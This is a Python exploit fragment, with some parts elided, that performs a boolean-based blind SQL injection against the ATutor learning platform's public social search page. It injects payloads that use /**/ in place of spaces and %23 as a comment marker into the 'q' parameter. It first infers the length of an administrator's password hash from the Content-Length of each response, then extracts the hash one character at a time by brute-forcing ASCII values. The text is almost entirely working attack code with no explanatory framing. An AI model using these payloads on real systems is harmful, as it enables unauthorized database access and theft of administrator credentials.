...
def searchFriends_sqli(ip):
    ...
    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(password)/**/FROM/**/AT_admins/**/WHERE/**/login/**/='{}')={}%23".format(ip, username, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
    ...
    for i in range(1, password_hash_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/AT_admins/**/WHERE/**/login/**/='{}'),{},1)))=[REPLACEMENT]%23".format(username, i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
